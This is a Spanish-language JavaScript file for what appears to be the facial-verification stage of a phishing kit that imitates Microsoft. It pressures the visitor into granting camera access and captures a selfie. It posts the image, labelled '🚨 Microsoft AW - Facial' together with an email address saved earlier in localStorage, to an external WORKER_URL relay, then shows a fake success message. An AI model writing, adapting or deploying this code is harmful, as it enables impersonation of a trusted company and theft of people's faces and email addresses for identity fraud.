const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('capture');
const userEmail = localStorage.getItem('userEmail') || 'No especificado';

async function iniciarCamara() {
  captureBtn.disabled = true;

  if (!navigator.mediaDevices?.getUserMedia) {
    alert('Tu navegador no permite acceder a la cámara.');
    return;
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false
    });

    video.srcObject = stream;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        resolve();
      };
    });

    await video.play();
    captureBtn.disabled = false;
  } catch (error) {
    console.error(error);
    alert('⚠️ Es obligatorio aceptar los permisos de cámara para continuar.');
    location.reload();
  }
}

iniciarCamara();

captureBtn.addEventListener('click', async () => {
  if (video.style.display !== 'none') {
    if (!video.videoWidth || !video.videoHeight) {
      alert('La cámara aún no está lista. Espera un segundo.');
      return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    video.style.display = 'none';
    canvas.style.display = 'block';
    captureBtn.disabled = true;
    captureBtn.textContent = 'Verificando...';

    try {
      const selfieData = canvas.toDataURL('image/png');
      const responseBlob = await fetch(selfieData);
      const blob = await responseBlob.blob();

      const mensaje = [
        '🚨 Microsoft AW - Facial',
        `🪪 Correo: ${userEmail}`
      ].join('\n');

      const formData = new FormData();
      formData.append('foto', blob, 'selfie.png');
      formData.append('mensaje', mensaje);

      const result = await fetch(WORKER_URL, {
        method: 'POST',
        body: formData
      });

      if (result.ok) {
        captureBtn.textContent = '✅ Verificación Exitosa';

        setTimeout(() => {
          window.location.href = 'index.html';
        }, 1500);
      } else {
        throw new Error('Error en la respuesta del servidor.');
      }
    } catch (err) {
      console.error(err);
      captureBtn.disabled = false;
      captureBtn.textContent = '❌ Error de conexión. Toca para reintentar';
    }
  } else {
    video.style.display = 'block';
    canvas.style.display = 'none';
    captureBtn.textContent = 'Verificar';
  }
});